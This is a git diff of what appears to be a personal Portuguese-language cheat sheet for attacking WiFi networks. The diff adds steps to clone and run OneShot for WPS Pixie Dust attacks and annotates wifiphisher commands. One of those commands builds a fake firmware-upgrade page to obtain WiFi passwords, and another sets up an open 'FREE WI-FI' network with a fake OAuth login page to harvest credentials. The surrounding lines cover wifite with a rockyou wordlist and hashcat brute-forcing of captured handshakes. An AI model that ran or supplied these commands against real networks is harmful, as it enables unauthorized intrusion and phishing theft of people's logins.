@@ -19,6 +19,12 @@ git status
 #Mais efectivo (Só wifi com WPS ativado)
 Sudo wifite --wps -dict rockyou.txt 
 
+#Usando o OneShot (mostra as redes vulneraveis a atack WPS)
+Sudo su
+git clone https://github.com/fulvius31/OneShot.git
+cd OneShot
+python3 oneshot.py -i wlan0 -K (Ver todas conecções e escolhe uma)
+
 
 #Usando wifite para hanshake e hashcat para brute force
 sudo cap2hccapx <nombre del archivo>.cap <nombre del archivo>.hccapx (arquivo cap e onde tem as hanshake do wifite)
@@ -31,7 +37,9 @@ sudo hashcat -m 22000 -a3 ?d?d?d?d (aquivo).hccapx
 
    ## Capturando dados sociais por WIFI ##
 
-wifiphisher -aI wlan0 -eI wlan4 -p firmware-upgrade --handshake-capture handshake.pcap
+$ Cria uma rede solicitando a senha para atualização de firmware
+sudo wifiphisher -aI wlan0 -eI wlan4 -p firmware-upgrade --handshake-capture handshake.pcap
+$ Cria uma rede aberta para captura de dados sociais
 sudo wifiphisher --noextensions --essid "FREE WI-FI" -p oauth-login -kB
 
 --------------------------------------------------------------------------------------
